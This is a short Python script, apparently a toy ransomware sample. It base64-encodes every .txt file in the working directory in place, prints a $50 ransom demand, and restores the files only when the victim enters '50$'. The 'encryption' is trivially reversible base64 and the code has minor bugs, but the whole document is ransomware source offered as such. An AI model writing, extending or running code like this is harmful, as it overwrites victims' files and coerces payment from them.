import os
import base64


def encrypt_file(filename):
    try:
        with open(filename, 'rb') as f:
            content = f.read()
            encoded_content = base64.b64encode(content).decode()

        with open(filename, 'w') as f:
            f.write(encoded_content)
        print(f'File {filename} has been encryted')
    except Exception as e:
        print(' Error: {str(e)}')


def decrypt_file(filename):
    try:
        with open(filename, 'r') as f:
            encoded_content = f.read()


            while len(encoded_content) % 4 != 0:
                encoded_content += '='

            decoded_content = base64.b64decode(encoded_content.encode())

        with open(filename, 'wb') as f:
            f.write(decoded_content)

        print(f'Decryption successful')
    except Exception as e:
        print(f'Decryption failed {str(e)}')


current_dir = os.getcwd()

for file in os.listdir(current_dir):
    if file.endswith('.txt'):
        encrypt_file(file)

print('To get your files back,you need to the ransom that is 50$')

key = input('Enter Ransom 50$: ')

if key == '50$':
    for file in os.listdir(current_dir):
        if file.endswith('.txt'):
            decrypt_file(file)

    print('All files decrypted successfully.')
else:
    print('You really thought that would work? Now your all files has been encryted forever!!')
